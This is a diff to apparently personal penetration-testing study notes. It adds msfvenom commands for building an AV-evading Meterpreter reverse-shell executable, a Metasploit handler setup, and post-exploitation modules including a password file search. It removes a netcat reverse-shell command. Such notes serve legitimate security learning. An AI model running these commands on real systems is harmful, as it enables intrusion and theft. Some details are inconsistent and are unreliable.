@@ -762,6 +762,69 @@ After the exploit is successful,
 - `ifconfig`
 - `pwd`
 
+  **Creating a custom payload with Metasploit using `msfvenom`**
+
+  - You can deliver payloads by exploiting vulnerabilities in services/OS or by social engineering - with either method you have to deliver a payload
+
+  - Goal of the payload is to have the victim call back to hacker's C2 server C2 server with SYN packets
+
+  - `msfvenom` is part of metasploit that can be used to create custom payloads. Its easy to create a payload, but the challenge is to **encode** it well enough so it is able to evade the IDS/AV solutions
+
+    - `-p` designates the Metasploit payload we want to use.
+    - `-e` designates the encoder we want to use.
+    - `-a` designates the architecture we want to use (the default is `x86`).
+    - `-s` designates the maximum size of the payload.
+    - `-i` designates the number of iterations with which to encode the payload.
+    - `-x` designates a custom executable file to use as a template.
+    - `-o` designates an output file to be created, specifying its name and location.
+
+
+- `msfvenom -l payloads` will show a list of all the available payloads in metasploit
+- `msfvenom -l encoders` These are algorithms that encodes the script so that is becomes less likely to be detected
+- `msfvenom -l formats` These list the various formats the code should be at like python, runy, bash etc
+
+- The purpose of the msfvenom command is to generate a payload script that when run on the victim machine will establish a retrograde connection with the hacker's machine
+
+Things to take into account when desiging a payload
+1. Staged vs stageless. Generally staged is preferred- Its the delivery mechanism, delivering large amount of script in a single instance (stageless) is more likely to fail and thus be error prone
+2. Architecture `-a x86` is common
+3. Encoder to use `-e x86/shikata_ga_nai` is common to use
+4. Defining the file type, typically exe `-f exe`
+5. Path where the file will be placed after creation could be in the `temp` folder, or `www` folder - is specified using the `-o` flag
+6. The listening host and the port, which is usually defined for the hacker's machine
+
+  - `msfvenom -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai -f exe -o /tmp/hack.exe LHOST=<hacker's ip address> LPORT=4444`
+
+      - `msfvenom`: Launches the `msfvenom` program.
+
+      - `-p`: Indicates payload. 
+
+      - `windows/meterpreter/reverse_tcp`: The Metasploit command module.
+
+      - `-a x86`: Designates the architecture we will use. `x86` is default.
+
+      - `-e x86/shikata_ga_nai`: Designates the encoder we will use.
+
+      - `-f exe`: Indicates the file type to create. In this case, `.exe`.
+
+      - `-o /tmp/malware.exe`: Creates an output file, naming the file (`malware.exe`) and location (inside the `/tmp` directory).
+
+- All of this so far is just creating the payload. Now we have to deliver this using metasploit and then execute it after opening a shell using meterpreter
+
+**Metsaploit code to listen for retrograde connection from the Victim**
+
+Asuming that the payload is already downloaded in the victim machine either via social engineering or via exploitation of services or OS vulnerabilities and establishing a meterpreter session
+
+- `msfconsole`
+- `use exploit/multi/handler` executes a sequence of commands to target a specific vulnerability
+- `set payload windows/meterpreter/reverse_tcp` 
+- `show options`
+- `set LHOST <hacker's ip address>` this ip address must be the same as mentioned in the payload
+- `set LPORT 4444`
+- `show options`
+- `exploit` or `run` - This will start listening for the victim's machine which is told to connect to the hacker using reverse shell
+
+Once a connection is established, the the terminal will now say `meterpreter`
 
 
 **Meterpreter**
@@ -808,11 +871,23 @@ Once we've connected to a Meterpreter session, we can run many other commands to
 
   - `download`: Downloads a file from the target.
 
-  - `search`: Searches for resources, similar to the `find` command in Linux.
+  - `search`: Searches for resources, similar to the `find` command in Linux. e-g `search -f *.jpg`, `search -f password*`
 
   - `run win_privs`: Provides more detailed Windows privilege information.
 
   - `run win_enum`: Runs a comprehensive suite of Windows enumerations and stores the results on the attacking machine.
+
+- We can also run further exploitation code with meterpreter with builtin meterpreter modules. A few examples are below:
+
+- `run post/windows/gather/`
+- `run post/windows/gather/enum_applications`
+- `run post/windows/gather/enum_logged_on_users` lists logged in users
+- `run post/windows/gather/enum_shares` enumerates network shares
+- `run post/windows/gather/checkvm` checks if a victim is running inside a VM
+- `shell`
+- `net users`
+
+I asume that the above are run from hackers machine via the meterpreter session, but not so sure
 
 
 **Payload types**
@@ -841,13 +916,6 @@ Once we've connected to a Meterpreter session, we can run many other commands to
 - Alternatively a bin shell means that we connect to a target - usually used when reverse shell is not working
 - poping a shell means gaining access to a machine
 
-**Reverse Shell**
--`nc -nvlp 4444` attack box (lvp means listening verbose port)
--`nc 192.168.1.1 4444 -e /bin/sh` This is telling the victim machine to connect to the ip address of my attack machine 
-- Whenever a victim connects back to 
-
-**Bin shell**
-- You send an exploit to the victim's machine and then open a port there. Next you connect to it via your attacking VM once the port is established. All of this is done using Netcat
 
 **Payload** it is the exploit- there are various different options. You send it to a victim and then attempt to open a shell in the victim. It is either staged or unstaged
 - Windows type
